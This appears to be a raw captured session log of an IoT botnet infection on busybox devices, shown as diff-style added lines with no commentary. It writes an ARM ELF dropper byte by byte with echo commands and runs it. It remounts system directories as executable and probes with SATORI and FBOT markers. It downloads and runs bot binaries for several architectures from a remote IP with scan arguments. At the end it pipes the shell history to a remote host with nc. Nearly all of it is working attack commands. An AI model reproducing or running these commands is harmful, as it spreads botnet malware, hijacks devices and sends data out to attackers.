+/bin/busybox echo -en '\xe2\x00\x40\xa0\xe3\x00\x00\x00\xea\x01\x40\x84\xe2\x01\x60\x53\xe5\x00\x00\x56\xe3\x01\x30\x83\xe2\xfa\xff\xff\x1a\x10\x31\x9f\xe5' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x88\x30\x8d\xe5\x02\x30\xa0\xe3\x08\x11\x9f\xe5\x08\x21\x9f\xe5\xb4\x38\xcd\xe1\x04\x01\x9f\xe5\x05\x3a\xa0\xe3\xb6\x38\xcd\xe1\xb2' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x02\x00\xa0\xe3\xda\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00\x50' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xa0\xe1\x01\x00\xa0\x03\x98\xff\xff\x0b\x05\x00\xa0\xe1\x84\x10\x8d\xe2\x10\x20\xa0\xe3\xaf\xff\xff\xeb\x00\x00\x50\xe3\x00\x00\x60' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xb2\x91\xff\xff\xbb\x19\x40\x84\xe2\x05\x00\xa0\xe1\xac\x10\x9f\xe5\x04\x20\xa0\xe1\xb3\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0\x13' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x89\xff\xff\x1b\x98\x80\x9f\xe5\x06\x40\xa0\xe1\x97\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xb4\xff\xff\xeb\x01' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x50\xe3\x04\x00\xa0\xe3\x7f\xff\xff\x1b\x97\x30\xdd\xe5\x04\x44\x83\xe1\x08\x00\x54\xe1\xf4\xff\xff\x1a\x04\x40\x8d\xe2\x04\x10' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xa8\xff\xff\xeb\x00\x20\x50\xe2\x04\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\x98\xff\xff' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xeb\xf5\xff\xff\xea\x05\x00\xa0\xe1\x76\xff\xff\xeb\x07\x00\xa0\xe1\x74\xff\xff\xeb\x05\x00\xa0\xe3\x6a\xff\xff\xeb\x98\xd0\x8d\xe2' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xf0\x41\xbd\xe8\x1e\xff\x2f\xe1\xb1\x83\x00\x00\x8d\x62\x77\x1b\x41\x02\x00\x00\xff\x01\x00\x00\xb8\x83\x00\x00\xbc\x83\x00\x00\x0a' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x0d\x0a\x0d\x00\x00\x00\x00\x0d\xc0\xa0\xe1\xf0\x00\x2d\xe9\x00\x70\xa0\xe1\x01\x00\xa0\xe1\x02\x10\xa0\xe1\x03\x20\xa0\xe1\x78\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x9c\xe8\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x0e\xf0\xa0\x31\xff\xff\xff\xea\x04\xe0\x2d\xe5\x1c\x20\x9f\xe5\x00\x30\xa0' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\xe1\x02\x20\x9f\xe7\x06\x00\x00\xeb\x00\x30\x63\xe2\x02\x30\x80\xe7\x00\x00\xe0\xe3\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x64\x80\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x0f\x0a\xe0\xe3\x1f\xf0\x40\xe2\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x61\x72\x6d\x37\x00\x00\x00\x00\x2e\x7a\x00\x00\x47' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x61\x72\x6d\x37\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00\x01\x09\x00\x00\x00\x06\x02\x08' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x74\x62\x73\x73\x00\x2e' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x67\x6f\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x06\x00\x00\x00\xc0\x80\x00\x00\xc0\x00\x00\x00\xf0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xb0\x83\x00\x00\xb0\x03\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x04\x00\x00\xdc\x03\x01\x00\xdc\x03\x00\x00\x08\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\xdc\x03\x01\x00\xdc\x03' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x24\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00\x00\x00\xec\x03\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+/bin/busybox echo -en '\x00\x00\x00' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+./.x; ./.z telnet.arm7.echo; >.x; >.z
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+cd ~
+ cat .ash_history | nc 192.168.1.18 9090
+  cat .ash_history | nc 192.168.1.18 9090
